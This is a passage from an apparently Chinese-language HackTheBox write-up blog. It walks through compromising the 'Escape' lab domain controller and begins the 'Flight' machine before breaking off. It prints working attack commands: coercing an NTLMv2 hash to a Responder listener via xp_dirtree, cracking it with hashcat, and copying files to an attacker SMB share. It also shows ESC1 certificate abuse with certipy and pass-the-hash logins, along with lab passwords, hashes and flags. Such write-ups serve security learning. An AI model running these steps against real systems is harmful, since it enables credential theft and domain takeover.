class="line">464&#x2F;tcp  open  kpasswd5?</span><br><span class="line">593&#x2F;tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636&#x2F;tcp  open  ssl&#x2F;ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)</span><br><span class="line">1433&#x2F;tcp open  ms-sql-s      Microsoft SQL Server</span><br><span class="line">3268&#x2F;tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)</span><br><span class="line">3269&#x2F;tcp open  ssl&#x2F;ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)</span><br><span class="line">5985&#x2F;tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP&#x2F;UPnP)</span><br><span class="line">9389&#x2F;tcp open  mc-nmf        .NET Message Framing</span><br><span class="line">2 services unrecognized despite returning data. If you know the service&#x2F;version, please submit the following fingerprints at https:&#x2F;&#x2F;nmap.org&#x2F;cgi-bin&#x2F;submit.cgi?new-service :</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">SF-Port53-TCP:V&#x3D;7.80%I&#x3D;7%D&#x3D;3&#x2F;8%Time&#x3D;64089A0A%P&#x3D;x86_64-pc-linux-gnu%r(DNSVe</span><br><span class="line">SF:rsionBindReqTCP,20,&quot;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\x</span><br><span class="line">SF:04bind\0\0\x10\0\x03&quot;);</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">SF-Port1433-TCP:V&#x3D;7.80%I&#x3D;7%D&#x3D;3&#x2F;8%Time&#x3D;64089A0B%P&#x3D;x86_64-pc-linux-gnu%r(ms-</span><br><span class="line">SF:sql-s,25,&quot;\x04\x01\0%\0\0\x01\0\0\0\x15\0\x06\x01\0\x1b\0\x01\x02\0\x1c</span><br><span class="line">SF:\0\x01\x03\0\x1d\0\0\xff\x0f\0\x07\xd0\0\0\0\0&quot;);</span><br><span class="line">Service Info: Host: DC; OS: Windows; CPE: cpe:&#x2F;o:microsoft:windows</span><br></pre></td></tr></table></figure><h2 id="漏洞利用-22"><a class="markdownIt-Anchor" href="#漏洞利用-22"></a> 漏洞利用</h2><p>枚举SMB分享路径</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbmap -H 10.10.11.202 -u <span class="built_in">test</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[+] Guest session   IP: 10.10.11.202:445Name: 10.10.11.202                                      </span><br><span class="line">        Disk                                                  PermissionsComment</span><br><span class="line">----                                                  ------------------</span><br><span class="line">ADMIN$                                            NO ACCESSRemote Admin</span><br><span class="line">C$                                                NO ACCESSDefault share</span><br><span class="line">IPC$                                              READ ONLYRemote IPC</span><br><span class="line">NETLOGON                                          NO ACCESSLogon server share </span><br><span class="line">Public                                            READ ONLY</span><br><span class="line">SYSVOL                                            NO ACCESSLogon server share</span><br></pre></td></tr></table></figure><p>匿名登入路径<code>/Public</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.11.202/Public</span><br><span class="line">ls</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.                                   D        0  Sat Nov 19 06:51:25 2022</span><br><span class="line">..                                  D        0  Sat Nov 19 06:51:25 2022</span><br><span class="line">SQL Server Procedures.pdf           A    49551  Fri Nov 18 08:39:43 2022</span><br><span class="line"></span><br><span class="line">5184255 blocks of size 4096. 1468811 blocks available</span><br></pre></td></tr></table></figure><p>下载文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">get <span class="string">&quot;SQL Server Procedures.pdf&quot;</span></span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure><p>得到MSSQL登入凭证</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PublicUser:GuestUserCantWrite1</span><br></pre></td></tr></table></figure><p>登入MSSQL服务并启用responder</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python mssqlclient.py PublicUser:GuestUserCantWrite1@10.10.11.202</span><br><span class="line">responder -I tun0 -A</span><br></pre></td></tr></table></figure><p>访问responder</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master.dbo.xp_dirtree &#x27;\\<span class="number">10</span>.<span class="number">10</span>.*.*\BFL&#x27;</span><br></pre></td></tr></table></figure><p>获得NTLMv2如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SQL_SVC::sequel:8ac23c4c29037047:e9eda6f3888b9877036279efea3cb3c0:01010000000000000090858da351d901e3f5635e3fb70b460000000002000800510059004200330001001e00570049004e002d00550053004d0032005a0036003600370048005300300004003400570049004e002d00550053004d0032005a003600360037004800530030002e0051005900420033002e004c004f00430041004c000300140051005900420033002e004c004f00430041004c000500140051005900420033002e004c004f00430041004c00070008000090858da351d90106000400020000000800300030000000000000000000000000300000f4ab4ae3d13aea1739c364c66324ca7ba193602fb63935e338e10f1745d4aa2a0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e0032000000000000000000</span><br></pre></td></tr></table></figure><p>hashcat爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;SQL_SVC::sequel:8ac23c4c29037047:e9eda6f3888b9877036279efea3cb3c0:01010000000000000090858da351d901e3f5635e3fb70b460000000002000800510059004200330001001e00570049004e002d00550053004d0032005a0036003600370048005300300004003400570049004e002d00550053004d0032005a003600360037004800530030002e0051005900420033002e004c004f00430041004c000300140051005900420033002e004c004f00430041004c000500140051005900420033002e004c004f00430041004c00070008000090858da351d90106000400020000000800300030000000000000000000000000300000f4ab4ae3d13aea1739c364c66324ca7ba193602fb63935e338e10f1745d4aa2a0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e0032000000000000000000&#x27;</span> &gt; <span class="built_in">hash</span></span><br><span class="line">hashcat -m 5600 <span class="built_in">hash</span> /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure><p>明文如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REGGIE1234ronnie</span><br></pre></td></tr></table></figure><p>以sql_svc用户登入winrm服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.11.202 -u sql_svc -p REGGIE1234ronnie</span><br></pre></td></tr></table></figure><p>启用smb服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python smbserver.py BFL /tmp/ -smb2support</span><br></pre></td></tr></table></figure><p>回传文件</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">copy</span>-item -<span class="built_in">path</span> c:\sqlserver\logs\errorlog.bak -destination &#x27;\\<span class="number">10</span>.<span class="number">10</span>.*.*\BFL\&#x27;</span><br></pre></td></tr></table></figure><p>根据日志文件中的信息添加两个域名解析</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;10.10.11.202\tdc.sequel.htb&quot;</span> &gt;&gt; /etc/hosts</span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;10.10.11.202\tsequel.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><p>日志文件中存在两条登录信息如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">2022-11-18 13:43:07.44 Logon       Error: 18456, Severity: 14, State: 8.</span><br><span class="line">2022-11-18 13:43:07.44 Logon       Logon failed for user &#39;sequel.htb\Ryan.Cooper&#39;. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]</span><br><span class="line">2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.</span><br><span class="line">2022-11-18 13:43:07.48 Logon       Logon failed for user &#39;NuclearMosquito3&#39;. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]</span><br></pre></td></tr></table></figure><p>查看用户信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python lookupsid.py sql_svc:REGGIE1234ronnie@10.10.11.202</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">[*] Domain SID is: S-1-5-21-4078382237-1492182817-2568127209</span><br><span class="line">498: sequel\Enterprise Read-only Domain Controllers (SidTypeGroup)</span><br><span class="line">500: sequel\Administrator (SidTypeUser)</span><br><span class="line">501: sequel\Guest (SidTypeUser)</span><br><span class="line">502: sequel\krbtgt (SidTypeUser)</span><br><span class="line">512: sequel\Domain Admins (SidTypeGroup)</span><br><span class="line">513: sequel\Domain Users (SidTypeGroup)</span><br><span class="line">514: sequel\Domain Guests (SidTypeGroup)</span><br><span class="line">515: sequel\Domain Computers (SidTypeGroup)</span><br><span class="line">516: sequel\Domain Controllers (SidTypeGroup)</span><br><span class="line">517: sequel\Cert Publishers (SidTypeAlias)</span><br><span class="line">518: sequel\Schema Admins (SidTypeGroup)</span><br><span class="line">519: sequel\Enterprise Admins (SidTypeGroup)</span><br><span class="line">520: sequel\Group Policy Creator Owners (SidTypeGroup)</span><br><span class="line">521: sequel\Read-only Domain Controllers (SidTypeGroup)</span><br><span class="line">522: sequel\Cloneable Domain Controllers (SidTypeGroup)</span><br><span class="line">525: sequel\Protected Users (SidTypeGroup)</span><br><span class="line">526: sequel\Key Admins (SidTypeGroup)</span><br><span class="line">527: sequel\Enterprise Key Admins (SidTypeGroup)</span><br><span class="line">553: sequel\RAS and IAS Servers (SidTypeAlias)</span><br><span class="line">571: sequel\Allowed RODC Password Replication Group (SidTypeAlias)</span><br><span class="line">572: sequel\Denied RODC Password Replication Group (SidTypeAlias)</span><br><span class="line">1000: sequel\DC$ (SidTypeUser)</span><br><span class="line">1101: sequel\DnsAdmins (SidTypeAlias)</span><br><span class="line">1102: sequel\DnsUpdateProxy (SidTypeGroup)</span><br><span class="line">1103: sequel\Tom.Henn (SidTypeUser)</span><br><span class="line">1104: sequel\Brandon.Brown (SidTypeUser)</span><br><span class="line">1105: sequel\Ryan.Cooper (SidTypeUser)</span><br><span class="line">1106: sequel\sql_svc (SidTypeUser)</span><br><span class="line">1107: sequel\James.Roberts (SidTypeUser)</span><br><span class="line">1108: sequel\Nicole.Thompson (SidTypeUser)</span><br><span class="line">1109: sequel\SQLServer2005SQLBrowserUser$DC (SidTypeAlias)</span><br></pre></td></tr></table></figure><p>用户名<code>NuclearMosquito3</code>并不存在</p><p>尝试将<code>NuclearMosquito3</code>作为<code>ryan.cooper</code>用户的密码登入winrm服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.11.202 -u Ryan.Cooper -p NuclearMosquito3</span><br></pre></td></tr></table></figure><p>登入成功，查看user.txt</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> c:\users\ryan.cooper\desktop\user.txt</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0cbcb92fcd258be421cbdfbadaebd0bf</span><br></pre></td></tr></table></figure><h2 id="权限提升-23"><a class="markdownIt-Anchor" href="#权限提升-23"></a> 权限提升</h2><blockquote><p>This is a quick lab to familiarize with ECS1 privilege escalation technique, that illustrates how it’s possible to elevate from a regular user to domain administrator in a Windows Domain by abusing over-permissioned Active Directory Certificate Services (ADCS) certificate templates.<br /><a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-misconfigured-certificate-template-to-domain-admin">https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-misconfigured-certificate-template-to-domain-admin</a></p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install certipy-ad</span><br></pre></td></tr></table></figure><p>该程序v4.3.0版本在python3.11环境无法正常运行</p><p>查询是否存在错误配置的证书模板</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy find -vulnerable -stdout -u ryan.cooper@sequel.htb -p NuclearMosquito3 -dc-ip 10.10.11.202</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">[*] Enumeration output:</span><br><span class="line">Certificate Authorities</span><br><span class="line">  0</span><br><span class="line">    CA Name                             : sequel-DC-CA</span><br><span class="line">    DNS Name                            : dc.sequel.htb</span><br><span class="line">    Certificate Subject                 : CN&#x3D;sequel-DC-CA, DC&#x3D;sequel, DC&#x3D;htb</span><br><span class="line">    Certificate Serial Number           : 1EF2FA9A7E6EADAD4F5382F4CE283101</span><br><span class="line">    Certificate Validity Start          : 2022-11-18 20:58:46+00:00</span><br><span class="line">    Certificate Validity End            : 2121-11-18 21:08:46+00:00</span><br><span class="line">    Web Enrollment                      : Disabled</span><br><span class="line">    User Specified SAN                  : Disabled</span><br><span class="line">    Request Disposition                 : Issue</span><br><span class="line">    Enforce Encryption for Requests     : Enabled</span><br><span class="line">    Permissions</span><br><span class="line">      Owner                             : SEQUEL.HTB\Administrators</span><br><span class="line">      Access Rights</span><br><span class="line">        ManageCertificates              : SEQUEL.HTB\Administrators</span><br><span class="line">                                          SEQUEL.HTB\Domain Admins</span><br><span class="line">                                          SEQUEL.HTB\Enterprise Admins</span><br><span class="line">        ManageCa                        : SEQUEL.HTB\Administrators</span><br><span class="line">                                          SEQUEL.HTB\Domain Admins</span><br><span class="line">                                          SEQUEL.HTB\Enterprise Admins</span><br><span class="line">        Enroll                          : SEQUEL.HTB\Authenticated Users</span><br><span class="line">Certificate Templates</span><br><span class="line">  0</span><br><span class="line">    Template Name                       : UserAuthentication</span><br><span class="line">    Display Name                        : UserAuthentication</span><br><span class="line">    Certificate Authorities             : sequel-DC-CA</span><br><span class="line">    Enabled                             : True</span><br><span class="line">    Client Authentication               : True</span><br><span class="line">    Enrollment Agent                    : False</span><br><span class="line">    Any Purpose                         : False</span><br><span class="line">    Enrollee Supplies Subject           : True</span><br><span class="line">    Certificate Name Flag               : EnrolleeSuppliesSubject</span><br><span class="line">    Enrollment Flag                     : PublishToDs</span><br><span class="line">                                          IncludeSymmetricAlgorithms</span><br><span class="line">    Private Key Flag                    : 16777216</span><br><span class="line">                                          65536</span><br><span class="line">                                          ExportableKey</span><br><span class="line">    Extended Key Usage                  : Client Authentication</span><br><span class="line">                                          Secure Email</span><br><span class="line">                                          Encrypting File System</span><br><span class="line">    Requires Manager Approval           : False</span><br><span class="line">    Requires Key Archival               : False</span><br><span class="line">    Authorized Signatures Required      : 0</span><br><span class="line">    Validity Period                     : 10 years</span><br><span class="line">    Renewal Period                      : 6 weeks</span><br><span class="line">    Minimum RSA Key Length              : 2048</span><br><span class="line">    Permissions</span><br><span class="line">      Enrollment Permissions</span><br><span class="line">        Enrollment Rights               : SEQUEL.HTB\Domain Admins</span><br><span class="line">                                          SEQUEL.HTB\Domain Users</span><br><span class="line">                                          SEQUEL.HTB\Enterprise Admins</span><br><span class="line">      Object Control Permissions</span><br><span class="line">        Owner                           : SEQUEL.HTB\Administrator</span><br><span class="line">        Write Owner Principals          : SEQUEL.HTB\Domain Admins</span><br><span class="line">                                          SEQUEL.HTB\Enterprise Admins</span><br><span class="line">                                          SEQUEL.HTB\Administrator</span><br><span class="line">        Write Dacl Principals           : SEQUEL.HTB\Domain Admins</span><br><span class="line">                                          SEQUEL.HTB\Enterprise Admins</span><br><span class="line">                                          SEQUEL.HTB\Administrator</span><br><span class="line">        Write Property Principals       : SEQUEL.HTB\Domain Admins</span><br><span class="line">                                          SEQUEL.HTB\Enterprise Admins</span><br><span class="line">                                          SEQUEL.HTB\Administrator</span><br><span class="line">    [!] Vulnerabilities</span><br><span class="line">      ESC1                              : &#39;SEQUEL.HTB\\Domain Users&#39; can enroll, enrollee supplies subject and template allows client authentication</span><br></pre></td></tr></table></figure><p>模板名为<code>UserAuthentication</code>, CA为<code>sequel-DC-CA</code></p><p>错误配置证书模板的配置条件为以下三点，分别对应任意证书申请对象，证书可用于AD，证书申请者为经验证的域用户</p><ul><li>msPKI-Certificates-Name-Flag: ENROLLEE_SUPPLIES_SUBJECT</li><li>PkiExtendedKeyUsage: Client Authentication</li><li>Enrollment Rights: Authenticated Users</li></ul><p>域用户<code>ryan.cooper</code>为域管理员<code>administrator</code>申请证书</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy req -u ryan.cooper@sequel.htb -p NuclearMosquito3 -target dc.sequel.htb -template UserAuthentication -ca sequel-DC-CA -upn administrator@sequel.htb</span><br></pre></td></tr></table></figure><p>证书名如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">administrator.pfx</span><br></pre></td></tr></table></figure><p>同步时间</p><p>使用证书通过Kerberos生成TGT并还原为NT Hash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntpdate -u 10.10.11.202 &amp;&amp; certipy auth -pfx administrator.pfx -dc-ip 10.10.11.202</span><br></pre></td></tr></table></figure><p>得到Hash</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee</span><br></pre></td></tr></table></figure><p>Hash传递登入winrm</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.11.202 -u administrator -H a52f78e4c751e5f5e17e1e9f3e58f4ee</span><br></pre></td></tr></table></figure><p>查看root.txt</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> c:\users\administrator\desktop\root.txt</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a54e5111794f55e2445b72fdcc3291d6</span><br></pre></td></tr></table></figure><hr /><blockquote><p>openvpn与Kerberos的竞争</p></blockquote><p>靶机的CST比现实的快了8个小时，所以自然就有了以下错误</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)</span><br></pre></td></tr></table></figure><p>原以为一条命令就能解决的事情</p><p><code>ntpdate -u 10.10.11.202</code></p><p>毕竟之前（一年半以前）也碰到过类似的情况</p><p>然而命令并没有生效</p><p>确切来讲是生效几秒后就会自动调回去</p><p>结合另外一个正在运行openvpn的窗口总是在我运行时间同步命令的时候重连vpn</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[htb] Inactivity timeout (--ping-restart), restarting</span><br></pre></td></tr></table></figure><p>所以这就是问题所在，大概是opevpn也要做时间同步</p><p>但是所幸openvpn的时间同步有一段间隔时间</p><p>多试几次卡在间隔时间跑完命令就行</p><p>估计是openvpn的更新加了这个功能，下次遇到再看看怎么调参数忽略openvpn的时间同步吧</p><hr /><p>Nice one.</p><h1 id="hackthebox_flight"><a class="markdownIt-Anchor" href="#hackthebox_flight"></a> HackTheBox_Flight</h1><h2 id="信息收集-8"><a class="markdownIt-Anchor" href="#信息收集-8"></a> 信息收集</h2><h3 id="端口扫描-25"><a class="markdownIt-Anchor" href="#端口扫描-25"></a> 端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 1-10000 -sV -T5 -v 10.10.11.187</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 10.10.11.187</span><br><span class="line">Host is up (0.13s latency).</span><br><span class="line">Not shown: 9986 filtered ports</span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">53&#x2F;tcp   open  domain?</span><br><span class="line">80&#x2F;tcp   open  http          Apache httpd 2.4.52 ((Win64) OpenSSL&#x2F;1.1.1m PHP&#x2F;8.1.1)</span><br><span class="line">88&#x2F;tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-03-09 17:59:10Z)</span><br><span class="line">135&#x2F;tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line">139&#x2F;tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389&#x2F;tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)</span><br><span class="line">445&#x2F;tcp  open  microsoft-ds?</span><br><span class="line">464&#x2F;tcp  open  kpasswd5?</span><br><span class="line">593&#x2F;tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636&#x2F;tcp  open  tcpwrapped</span><br><span class="line">3268&#x2F;tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)</span><br><span class="line">3269&#x2F;tcp open  tcpwrapped</span><br><span class="line">5985&#x2F;tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP&#x2F;UPnP)</span><br><span class="line">9389&#x2F;tcp open  mc-nmf        .NET Message Framing</span><br><span class="line">1 service unrecognized despite returning data. If you know the service&#x2F;version, please submit the following fingerprint at https:&#x2F;&#x2F;nmap.org&#x2F;cgi-bin&#x2F;submit.cgi?new-service :</span><br><span class="line">SF-Port53-TCP:V&#x3D;7.80%I&#x3D;7%D&#x3D;3&#x2F;9%Time&#x3D;6409BDB7%P&#x3D;x86_64-pc-linux-gnu%r(DNSVe</span><br><span class="line">SF:rsionBindReqTCP,20,&quot;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\x</span><br><span class="line">SF:04bind\0\0\x10\0\x03&quot;);</span><br><span class="line">Service Info: Host: G0; OS: Windows; CPE: cpe:&#x2F;o:microsoft:windows</span><br></pre></td></tr></table></figure><h3 id="路径枚举-5"><a class="markdownIt-Anchor" href="#路径枚举-5"></a> 路径枚举</h3><p>未枚举出路径</p><h3 id="vhost-2"><a class="markdownIt-Anchor" href="#vhost-2"></a> VHOST</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://10.10.11.187/ | grep htb</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;lf&quot;</span>&gt;</span>Copyright 2022 <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>flight.htb<span class="tag">&lt;/<span class="name">a</span>&gt;</span> - All Rights Reserved<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p>得到域名<code>flight.htb</code></p><p>添加域名解析</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;10.10.11.187\tflight.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><p>枚举VHOST</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u <span class="string">&quot;http://flight.htb&quot;</span> -H <span class="string">&quot;Host: FUZZ.flight.htb&quot;</span> --hl 154</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">000000624:   200        90 L     412 W      3996 Ch     &quot;school&quot;</span><br></pre></td></tr></table></figure><p>得到域名<code>school.flight.htb</code></p><p>添加域名解析</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;10.10.11.187\tschool.flight.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><h2 id="漏洞利用-23"><a class="markdownIt-Anchor" href="#漏洞利用-23"></a> 漏洞利用</h2><p>LFI?</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://school.flight.htb/index.php?view=index.php</span><br></pre></td></tr></table></figure><p>HTML源码中得到index.php代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 